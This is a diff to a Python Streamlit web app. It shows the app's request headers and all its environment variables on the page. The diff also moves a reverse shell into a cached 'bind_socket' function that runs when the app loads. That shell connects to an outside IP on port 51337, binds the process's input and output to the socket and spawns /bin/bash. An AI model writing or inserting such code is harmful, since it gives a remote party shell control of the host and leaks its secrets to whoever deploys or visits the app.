@@ -38,13 +38,19 @@ print("streamlit app called ")
 st.write(st.context.headers)
 st.write(os.environ)
 
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("54.226.94.89",51337))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-pty.spawn("/bin/bash")
+@st.cache
+def bind_socket():
+    # This function will only be run the first time it's called
+    print("Socket bound!")
 
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("54.226.94.89",51337))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    pty.spawn("/bin/bash")
+bind_socket()
+    
 st.info(
     """
     Need a feature that's not on here?
